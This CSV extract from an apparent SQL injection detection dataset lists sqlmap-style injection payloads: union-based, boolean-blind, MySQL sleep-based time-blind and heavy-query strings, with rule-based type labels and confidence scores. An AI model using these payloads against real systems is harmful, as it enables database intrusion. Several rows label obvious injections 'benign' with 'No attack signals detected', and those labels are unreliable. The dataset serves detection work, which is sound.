row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1350,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1351,select case when 1892 = 3646 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1352,"-7416"" where 7656 = 7656 order by 1--",1,,boolean_blind,generic,0.95,7656 = 7656 or detected — boolean_blind injection (priority 8) on generic,rule-based
1353,"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk",1,,boolean_blind,generic,0.95,"like "", rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
1354,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1355,"-6747"" or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1356,-1219' ) or 5592 = 4835,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1357,"1"" ) ) ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1358,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1359,"-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1360,"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1361,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1362,1 ) as mtda where 3951 = 3951,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
